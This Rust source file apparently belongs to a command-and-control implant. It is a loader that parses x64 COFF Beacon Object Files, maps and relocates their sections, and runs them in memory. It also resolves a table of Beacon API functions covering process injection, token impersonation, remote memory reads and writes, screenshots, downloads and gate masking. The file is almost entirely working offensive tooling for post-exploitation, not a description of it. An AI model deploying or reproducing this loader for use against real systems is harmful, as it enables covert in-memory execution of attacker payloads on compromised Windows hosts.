#[cfg(windows)]
fn resolve_external_symbol(symbol_name: &str) -> Option<*mut c_void> {
    let mut cursor = trim_leading_underscores(symbol_name);
    if let Some(rest) = cursor.strip_prefix("imp_") {
        cursor = rest;
    }

    let internal = match cursor {
        "BeaconDataParse" => Some(beacon_data_parse as *const () as *mut c_void),
        "BeaconDataInt" => Some(beacon_data_int as *const () as *mut c_void),
        "BeaconDataShort" => Some(beacon_data_short as *const () as *mut c_void),
        "BeaconDataLength" => Some(beacon_data_length as *const () as *mut c_void),
        "BeaconDataExtract" => Some(beacon_data_extract as *const () as *mut c_void),
        "BeaconDataPtr" => Some(beacon_data_ptr as *const () as *mut c_void),
        "BeaconOutput" => Some(beacon_output as *const () as *mut c_void),
        "BeaconPrintf" => Some(beacon_printf as *const () as *mut c_void),
        "BeaconFormatAlloc" => Some(beacon_format_alloc as *const () as *mut c_void),
        "BeaconFormatReset" => Some(beacon_format_reset as *const () as *mut c_void),
        "BeaconFormatAppend" => Some(beacon_format_append as *const () as *mut c_void),
        "BeaconFormatPrintf" => Some(beacon_format_printf as *const () as *mut c_void),
        "BeaconFormatToString" => Some(beacon_format_to_string as *const () as *mut c_void),
        "BeaconFormatFree" => Some(beacon_format_free as *const () as *mut c_void),
        "BeaconFormatInt" => Some(beacon_format_int as *const () as *mut c_void),
        "BeaconUseToken" => Some(beacon_use_token as *const () as *mut c_void),
        "BeaconRevertToken" => Some(beacon_revert_token as *const () as *mut c_void),
        "BeaconIsAdmin" => Some(beacon_is_admin as *const () as *mut c_void),
        "toWideChar" => Some(to_wide_char as *const () as *mut c_void),
        "BeaconAddValue" => Some(beacon_add_value as *const () as *mut c_void),
        "BeaconGetValue" => Some(beacon_get_value as *const () as *mut c_void),
        "BeaconRemoveValue" => Some(beacon_remove_value as *const () as *mut c_void),
        "BeaconGetSpawnTo" => Some(beacon_get_spawn_to as *const () as *mut c_void),
        "BeaconSpawnTemporaryProcess" => Some(beacon_spawn_temporary_process as *const () as *mut c_void),
        "BeaconInjectProcess" => Some(beacon_inject_process as *const () as *mut c_void),
        "BeaconInjectTemporaryProcess" => Some(beacon_inject_temporary_process as *const () as *mut c_void),
        "BeaconCleanupProcess" => Some(beacon_cleanup_process as *const () as *mut c_void),
        "BeaconVirtualAlloc" => Some(beacon_virtual_alloc as *const () as *mut c_void),
        "BeaconVirtualAllocEx" => Some(beacon_virtual_alloc_ex as *const () as *mut c_void),
        "BeaconVirtualProtect" => Some(beacon_virtual_protect as *const () as *mut c_void),
        "BeaconVirtualProtectEx" => Some(beacon_virtual_protect_ex as *const () as *mut c_void),
        "BeaconVirtualFree" => Some(beacon_virtual_free as *const () as *mut c_void),
        "BeaconGetThreadContext" => Some(beacon_get_thread_context as *const () as *mut c_void),
        "BeaconSetThreadContext" => Some(beacon_set_thread_context as *const () as *mut c_void),
        "BeaconResumeThread" => Some(beacon_resume_thread as *const () as *mut c_void),
        "BeaconOpenProcess" => Some(beacon_open_process as *const () as *mut c_void),
        "BeaconOpenThread" => Some(beacon_open_thread as *const () as *mut c_void),
        "BeaconCloseHandle" => Some(beacon_close_handle as *const () as *mut c_void),
        "BeaconUnmapViewOfFile" => Some(beacon_unmap_view_of_file as *const () as *mut c_void),
        "BeaconVirtualQuery" => Some(beacon_virtual_query as *const () as *mut c_void),
        "BeaconDuplicateHandle" => Some(beacon_duplicate_handle as *const () as *mut c_void),
        "BeaconReadProcessMemory" => Some(beacon_read_process_memory as *const () as *mut c_void),
        "BeaconWriteProcessMemory" => Some(beacon_write_process_memory as *const () as *mut c_void),
        "BeaconInformation" => Some(beacon_information as *const () as *mut c_void),
        "BeaconGetOutputData" => Some(beacon_get_output_data as *const () as *mut c_void),
        "BeaconDownload" => Some(beacon_download as *const () as *mut c_void),
        "BeaconGetSyscallInformation" => Some(beacon_get_syscall_information as *const () as *mut c_void),
        "swap_endianess" => Some(swap_endianess as *const () as *mut c_void),
        "BeaconDataStoreGetItem" => Some(beacon_data_store_get_item as *const () as *mut c_void),
        "BeaconDataStoreProtectItem" => Some(beacon_data_store_protect_item as *const () as *mut c_void),
        "BeaconDataStoreUnprotectItem" => Some(beacon_data_store_unprotect_item as *const () as *mut c_void),
        "BeaconDataStoreMaxEntries" => Some(beacon_data_store_max_entries as *const () as *mut c_void),
        "BeaconGetCustomUserData" => Some(beacon_get_custom_user_data as *const () as *mut c_void),
        "BeaconDisableBeaconGate" => Some(beacon_disable_beacon_gate as *const () as *mut c_void),
        "BeaconEnableBeaconGate" => Some(beacon_enable_beacon_gate as *const () as *mut c_void),
        "BeaconDisableBeaconGateMasking" => Some(beacon_disable_beacon_gate_masking as *const () as *mut c_void),
        "BeaconEnableBeaconGateMasking" => Some(beacon_enable_beacon_gate_masking as *const () as *mut c_void),
        "AxAddScreenshot" => Some(ax_add_screenshot as *const () as *mut c_void),
        "AxDownloadMemory" => Some(ax_download_memory as *const () as *mut c_void),
        "BeaconRegisterThreadCallback" => Some(beacon_register_thread_callback as *const () as *mut c_void),
        "BeaconUnregisterThreadCallback" => Some(beacon_unregister_thread_callback as *const () as *mut c_void),
        "BeaconWakeup" => Some(beacon_wakeup as *const () as *mut c_void),
        "BeaconGetStopJobEvent" => Some(beacon_get_stop_job_event as *const () as *mut c_void),
        _ => None,
    };
    if internal.is_some() {
        return internal;
    }

    if cursor.eq_ignore_ascii_case("C_specific_handler") {
        let module = CString::new("ntdll.dll").ok()?;
        let symbol = CString::new("__C_specific_handler").ok()?;
        let handle = unsafe { LoadLibraryA(module.as_ptr()) };
        if handle.is_null() {
            return None;
        }
        return Some(unsafe { GetProcAddress(handle, symbol.as_ptr() as *const u8) });
    }

    let (module_name, function_name) = if let Some((module, function)) = cursor.split_once('$') {
        (module.to_string(), function.to_string())
    } else {
        ("kernel32".to_string(), cursor.to_string())
    };

    let module_name = if module_name.contains('.') {
        module_name
    } else {
        format!("{module_name}.dll")
    };

    let module = cstring_lossy(&module_name)?;
    let handle = unsafe { LoadLibraryA(module.as_ptr()) };
    if handle.is_null() {
        return None;
    }

    if let Some(rest) = function_name.strip_prefix('#') {
        let ordinal = rest.parse::<usize>().ok()?;
        return Some(unsafe { GetProcAddress(handle, ordinal as *const u8) });
    }

    let function = cstring_lossy(&function_name)?;
    Some(unsafe { GetProcAddress(handle, function.as_ptr() as *const u8) })
}

#[cfg(windows)]
struct MappedSection {
    base: *mut u8,
    size: usize,
    characteristics: u32,
}

#[cfg(windows)]
impl Drop for MappedSection {
    fn drop(&mut self) {
        if !self.base.is_null() {
            unsafe {
                let _ = VirtualFree(self.base as LPVOID, 0, MEM_RELEASE);
            }
        }
    }
}

#[cfg(windows)]
fn parse_headers(object: &[u8]) -> Result<(FileHeader, Vec<SectionHeader>, usize, usize), String> {
    let header = unsafe { read_struct::<FileHeader>(object, 0) }?;
    if header.machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err("Only x64 BOFs are supported by this Rust template".to_string());
    }
    if header.number_of_sections == 0 || header.number_of_sections as usize > MAX_BOF_SECTIONS {
        return Err("BOF section count exceeds template limits".to_string());
    }

    let sections_offset = SIZEOF_FILE_HEADER + header.size_of_optional_header as usize;
    let mut sections = Vec::with_capacity(header.number_of_sections as usize);
    for index in 0..header.number_of_sections as usize {
        sections.push(unsafe { read_struct::<SectionHeader>(object, sections_offset + index * SIZEOF_SECTION_HEADER) }?);
    }

    let symbol_offset = header.pointer_to_symbol_table as usize;
    let symbol_bytes = header.number_of_symbols as usize * SIZEOF_SYMBOL;
    let string_offset = symbol_offset
        .checked_add(symbol_bytes)
        .ok_or_else(|| "COFF symbol table overflow".to_string())?;
    if symbol_offset == 0 || string_offset + 4 > object.len() {
        return Err("BOF symbol table pointer is invalid".to_string());
    }
    Ok((header, sections, symbol_offset, string_offset))
}

#[cfg(windows)]
fn map_sections(object: &[u8], sections: &[SectionHeader]) -> Result<Vec<MappedSection>, String> {
    let mut mapped = Vec::with_capacity(sections.len());
    for section in sections {
        let size = usize::max(section.virtual_size as usize, section.size_of_raw_data as usize);
        if size == 0 {
            mapped.push(MappedSection {
                base: null_mut(),
                size: 0,
                characteristics: section.characteristics,
            });
            continue;
        }

        let base = unsafe { VirtualAlloc(null_mut(), size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) as *mut u8 };
        if base.is_null() {
            return Err("VirtualAlloc failed while mapping BOF sections".to_string());
        }

        if section.size_of_raw_data > 0 {
            let start = section.pointer_to_raw_data as usize;
            let end = start
                .checked_add(section.size_of_raw_data as usize)
                .ok_or_else(|| "BOF raw section overflow".to_string())?;
            if end > object.len() {
                unsafe { let _ = VirtualFree(base as LPVOID, 0, MEM_RELEASE); }
                return Err("BOF section raw data is truncated".to_string());
            }
            unsafe {
                ptr::copy_nonoverlapping(object[start..end].as_ptr(), base, section.size_of_raw_data as usize);
            }
        }
        if size > section.size_of_raw_data as usize {
            unsafe {
                ptr::write_bytes(base.add(section.size_of_raw_data as usize), 0, size - section.size_of_raw_data as usize);
            }
        }

        mapped.push(MappedSection {
            base,
            size,
            characteristics: section.characteristics,
        });
    }
    Ok(mapped)
}

#[cfg(windows)]
fn apply_relocations(
    object: &[u8],
    header: &FileHeader,
    sections: &[SectionHeader],
    mapped: &[MappedSection],
    symbols: &[CoffSymbol],
    string_table: &[u8],
) -> Result<(), String> {
    for (section_index, section) in sections.iter().enumerate() {
        for reloc_index in 0..section.number_of_relocations as usize {
            let relocation_offset = section.pointer_to_relocations as usize + reloc_index * SIZEOF_RELOCATION;
            let relocation = unsafe { read_struct::<Relocation>(object, relocation_offset) }?;
            if relocation.symbol_table_index as usize >= symbols.len() {
                return Err("BOF relocation references invalid symbol index".to_string());
            }

            let target_section = mapped
                .get(section_index)
                .ok_or_else(|| "BOF relocation references missing target section".to_string())?;
            if target_section.base.is_null() {
                return Err("BOF relocation references unmapped target section".to_string());
            }
            if relocation.virtual_address as usize + 8 > target_section.size {
                return Err("BOF relocation target falls outside mapped section".to_string());
            }

            let symbol = &symbols[relocation.symbol_table_index as usize];
            let resolved = if symbol.section_number > 0 {
                let src_index = (symbol.section_number - 1) as usize;
                let source = mapped
                    .get(src_index)
                    .ok_or_else(|| "BOF relocation references invalid source section".to_string())?;
                if source.base.is_null() {
                    return Err("BOF relocation references unmapped source section".to_string());
                }
                unsafe { source.base.add(symbol.value as usize) as usize }
            } else {
                let name = symbol_name(symbol, string_table)?;
                resolve_external_symbol(&name)
                    .map(|ptr| ptr as usize)
                    .ok_or_else(|| format!("BOF unresolved symbol: {name}"))?
            };

            let target = unsafe { target_section.base.add(relocation.virtual_address as usize) };
            unsafe {
                match relocation.reloc_type {
                    IMAGE_REL_AMD64_ADDR64 => {
                        ptr::write_unaligned(target as *mut u64, resolved as u64);
                    }
                    IMAGE_REL_AMD64_ADDR32NB => {
                        let image_base = mapped.first().map_or(0usize, |section| section.base as usize);
                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(image_base) as u32);
                    }
                    IMAGE_REL_AMD64_REL32 => {
                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 4) as u32);
                    }
                    IMAGE_REL_AMD64_REL32_1 => {
                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 5) as u32);
                    }
                    IMAGE_REL_AMD64_REL32_2 => {
                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 6) as u32);
                    }
                    IMAGE_REL_AMD64_REL32_3 => {
                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 7) as u32);
                    }
                    IMAGE_REL_AMD64_REL32_4 => {
                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 8) as u32);
                    }
                    IMAGE_REL_AMD64_REL32_5 => {
                        ptr::write_unaligned(target as *mut u32, resolved.wrapping_sub(target as usize + 9) as u32);
                    }
                    other => {
                        return Err(format!("Unsupported BOF relocation type: 0x{other:04x}"));
                    }
                }
            }
        }
    }

    let _ = header;
    Ok(())
}

#[cfg(windows)]
fn find_entry_point(
    symbols: &[CoffSymbol],
    string_table: &[u8],
    mapped: &[MappedSection],
    entry_name: &str,
) -> Result<*mut c_void, String> {
    let mut index = 0usize;
    while index < symbols.len() {
        let symbol = &symbols[index];
        if symbol.section_number > 0 {
            let name = symbol_name(symbol, string_table)?;
            if trim_leading_underscores(&name).eq_ignore_ascii_case(entry_name) {
                let section_index = (symbol.section_number - 1) as usize;
                let section = mapped
                    .get(section_index)
                    .ok_or_else(|| "BOF entry references invalid section".to_string())?;
                if section.base.is_null() {
                    return Err("BOF entry references unmapped section".to_string());
                }
                let entry = unsafe { section.base.add(symbol.value as usize) };
                return Ok(entry as *mut c_void);
            }
        }
        index += 1 + symbol.number_of_aux_symbols as usize;
    }
    Err("BOF entry point 'go' was not found".to_string())
}

#[cfg(windows)]
fn protect_sections(sections: &[SectionHeader], mapped: &[MappedSection]) {
    for (section, mapping) in sections.iter().zip(mapped.iter()) {
        if mapping.base.is_null() || mapping.size == 0 {
            continue;
        }
        let mut old = 0u32;
        unsafe {
            let _ = VirtualProtect(mapping.base as LPVOID, mapping.size, section_protect(section), &mut old);
        }
    }
}

#[cfg(windows)]
pub fn load(object: &[u8], args: &[u8]) -> Result<BofContext, String> {
    let _ = protocol::COMMAND_EXEC_BOF;

    let mut ctx = BofContext::new();
    if object.len() < SIZEOF_FILE_HEADER {
        ctx.push(BOF_ERROR_PARSE, b"BOF payload is empty or truncated".to_vec());
        return Ok(ctx);
    }

    let (header, sections, symbol_offset, string_offset) = match parse_headers(object) {
        Ok(value) => value,
        Err(err) => {
            ctx.push(BOF_ERROR_PARSE, err.into_bytes());
            return Ok(ctx);
        }
    };

    let symbols: Vec<CoffSymbol> = (0..header.number_of_symbols as usize)
        .map(|index| unsafe { read_struct::<CoffSymbol>(object, symbol_offset + index * SIZEOF_SYMBOL) })
        .collect::<Result<_, _>>()
        .map_err(|err| {
            let mut out = BofContext::new();
            out.push(BOF_ERROR_PARSE, err.clone().into_bytes());
            err
        })?;

    let string_table_size = u32::from_le_bytes(object[string_offset..string_offset + 4].try_into().unwrap()) as usize;
    if string_offset + string_table_size > object.len() {
        ctx.push(BOF_ERROR_PARSE, b"COFF string table exceeds object bounds".to_vec());
        return Ok(ctx);
    }
    let string_table = &object[string_offset + 4..string_offset + string_table_size];

    let mapped = match map_sections(object, &sections) {
        Ok(mapped) => mapped,
        Err(err) => {
            ctx.push(BOF_ERROR_ALLOC, err.into_bytes());
            return Ok(ctx);
        }
    };

    if let Err(err) = apply_relocations(object, &header, &sections, &mapped, &symbols, string_table) {
        let msg_type = if err.starts_with("BOF unresolved symbol:") { BOF_ERROR_SYMBOL } else { BOF_ERROR_PARSE };
        ctx.push(msg_type, err.into_bytes());
        return Ok(ctx);
    }

    let entry = match find_entry_point(&symbols, string_table, &mapped, "go") {
        Ok(entry) => entry,
        Err(err) => {
            ctx.push(BOF_ERROR_ENTRY, err.into_bytes());
            return Ok(ctx);
        }
    };

    protect_sections(&sections, &mapped);

    type BofEntry = unsafe extern "C" fn(*mut c_char, i32);
    CURRENT_CONTEXT.store(&mut ctx as *mut BofContext, Ordering::SeqCst);
    unsafe {
        let entry: BofEntry = std::mem::transmute(entry);
        entry(args.as_ptr() as *mut c_char, args.len() as i32);
    }
    CURRENT_CONTEXT.store(null_mut(), Ordering::SeqCst);

    Ok(ctx)
}

#[cfg(windows)]
pub fn load_async(object: &[u8], args: &[u8]) -> Result<BofContext, String> {
    let _ = protocol::COMMAND_EXEC_BOF_ASYNC;
    load(object, args)
}

#[cfg(windows)]
pub fn pack_args(format: &str, args: &[&[u8]]) -> Result<Vec<u8>, String> {
    let mut packed = Vec::new();
    let mut arg_index = 0usize;

    for ch in format.chars() {
        let value = args.get(arg_index).ok_or_else(|| format!("missing argument for format specifier '{ch}'"))?;
        match ch {
            'i' => {
                if value.len() < 4 {
                    return Err("integer argument must be at least 4 bytes".to_string());
                }
                let num = i32::from_ne_bytes(value[..4].try_into().unwrap());
                packed.extend_from_slice(&num.to_be_bytes());
            }
            's' => {
                if value.len() < 2 {
                    return Err("short argument must be at least 2 bytes".to_string());
                }
                let num = i16::from_ne_bytes(value[..2].try_into().unwrap());
                packed.extend_from_slice(&num.to_be_bytes());
            }
            'z' => {
                let mut bytes = value.to_vec();
                if !bytes.ends_with(&[0]) {
                    bytes.push(0);
                }
                packed.extend_from_slice(&(bytes.len() as u32).to_be_bytes());
                packed.extend_from_slice(&bytes);
            }
            'Z' => {
                let text = String::from_utf8_lossy(value);
                let mut wide: Vec<u16> = text.encode_utf16().collect();
                if !wide.ends_with(&[0]) {
                    wide.push(0);
                }
                let bytes = unsafe {
                    slice::from_raw_parts(wide.as_ptr() as *const u8, wide.len() * size_of::<u16>())
                };
                packed.extend_from_slice(&(bytes.len() as u32).to_be_bytes());
                packed.extend_from_slice(bytes);
            }
            'b' => {
                packed.extend_from_slice(&(value.len() as u32).to_be_bytes());
                packed.extend_from_slice(value);
            }
            other => {
                return Err(format!("unsupported BOF pack format specifier '{other}'"));
            }
        }
        arg_index += 1;
    }

    if arg_index != args.len() {
        return Err("too many arguments supplied to BOF pack_args".to_string());
    }

    Ok(packed)
}
